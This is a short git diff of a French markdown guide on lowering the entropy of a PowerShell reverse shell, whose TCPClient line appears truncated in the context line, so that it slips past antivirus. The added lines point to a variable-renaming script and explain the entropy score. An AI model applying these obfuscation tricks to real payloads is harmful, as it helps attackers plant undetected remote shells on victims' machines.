@@ -40,10 +40,14 @@ $ffffffffffffffffffffffffffffffff = New-Object System.Net.Sockets.TCPClient('127
 
 Cela donnera une entropie bien inférieur à celle précédente et a probablement de meilleur chance face au Antivirus.
 
+Pour modifier automatiquement le nom des variables [voir scripts]().
+
 
 ## __Scripts__
 
 ### Calculate_entropy
+
+Plus la valeur est proche de 0 moins les caractères sont aléatoire.
 
 ```python
 #!/bin/python3
